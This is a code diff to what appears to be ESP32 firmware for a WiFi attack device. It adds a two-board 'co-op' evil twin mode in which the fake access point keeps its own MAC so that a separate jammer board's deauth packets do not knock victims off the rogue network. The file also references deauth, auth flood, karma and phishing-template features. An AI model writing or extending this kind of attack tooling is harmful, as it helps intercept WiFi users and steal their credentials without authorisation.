@@ -120,6 +120,7 @@ unsigned long lastAutoSync = 0;
 
 
 unsigned long evilTwinStartTime = 0;
+bool g_evilTwinCoop = false;
 
 ProbeEntry g_probeLog[PROBE_LOG_SIZE];
 volatile int g_probeLogHead = 0;
@@ -221,6 +222,7 @@ int apScrollPos = 0;
 
 int selectedTemplateIdx = 0;
 int templateSelection = 0;
+int evilTwinModeSelection = 0;
 
 int viewSelection = 0;
 int viewScrollPos = 0;
@@ -805,13 +807,20 @@ void startEvilTwinWithDeauth() {
   radioSetMode(RADIO_AP_STA);
   delay(100);
   // Clone BSSID target agar AP palsu benar-benar "twin" (bukan MAC original).
-  if (g_targetBSSID[0] != 0 || g_targetBSSID[1] != 0 || g_targetBSSID[2] != 0 ||
-      g_targetBSSID[3] != 0 || g_targetBSSID[4] != 0 || g_targetBSSID[5] != 0) {
-    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
-    if (macErr != ESP_OK) {
-      Serial.printf("[WARN] clone MAC target gagal (%d), pakai MAC existing\n", macErr);
+  // Mode CO-OP (2 board): JANGAN clone MAC, supaya deauth dari board jammer
+  // tidak ikut memutus korban yang sudah terhubung ke AP palsu ini.
+  if (!g_evilTwinCoop) {
+    if (g_targetBSSID[0] != 0 || g_targetBSSID[1] != 0 || g_targetBSSID[2] != 0 ||
+        g_targetBSSID[3] != 0 || g_targetBSSID[4] != 0 || g_targetBSSID[5] != 0) {
+      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+      if (macErr != ESP_OK) {
+        Serial.printf("[WARN] clone MAC target gagal (%d), pakai MAC existing\n", macErr);
+      }
+      delay(50);
     }
-    delay(50);
+  } else {
+    restoreOriginalApMac();
+    Serial.println("[EVIL TWIN] Mode CO-OP 2 BOARD: pakai MAC sendiri, tanpa deauth internal");
   }
 
   String safeSSID = targetSSID;
@@ -1043,9 +1052,9 @@ void handleAPListNavigation() {
         startDeauthEngine();
         drawDeauthMenu();
       } else if (currentState == AP_LIST_EVIL_TWIN) {
-        currentState = TEMPLATE_SELECT;
-        templateSelection = 0;
-        drawTemplateSelect();
+        currentState = EVIL_TWIN_MODE_SELECT;
+        evilTwinModeSelection = 0;
+        drawEvilTwinModeSelect();
       } else if (currentState == AP_LIST_AUTH_FLOOD) {
         currentState = AUTH_FLOOD_RUNNING;
         startAuthFlood();
@@ -1077,6 +1086,21 @@ void handleTemplateSelect() {
       startEvilTwinWithDeauth();
       drawEvilTwinRunning(0);
     }
+  }
+}
+
+void handleEvilTwinModeSelect() {
+  if (digitalRead(BTN_TOP) == LOW) {
+    delay(200);
+    evilTwinModeSelection = (evilTwinModeSelection + 1) % 2;
+    drawEvilTwinModeSelect();
+  }
+  if (digitalRead(BTN_BOTTOM) == LOW) {
+    delay(200);
+    g_evilTwinCoop = (evilTwinModeSelection == 1);
+    currentState = TEMPLATE_SELECT;
+    templateSelection = 0;
+    drawTemplateSelect();
   }
 }
 
@@ -1143,6 +1167,7 @@ void handleKarmaResults() {
 
     verifyAttempts = 0;
     verifyState = 0;
+    g_evilTwinCoop = false;
     currentState = EVIL_TWIN_RUNNING;
     startEvilTwinWithDeauth();
     drawEvilTwinRunning(0);
@@ -1597,6 +1622,9 @@ void loop() {
   }
   else if (currentState == TEMPLATE_SELECT) {
     handleTemplateSelect();
+  }
+  else if (currentState == EVIL_TWIN_MODE_SELECT) {
+    handleEvilTwinModeSelect();
   }
   else if (currentState == DEAUTH_MENU) {
     if (digitalRead(BTN_BOTTOM) == LOW) {
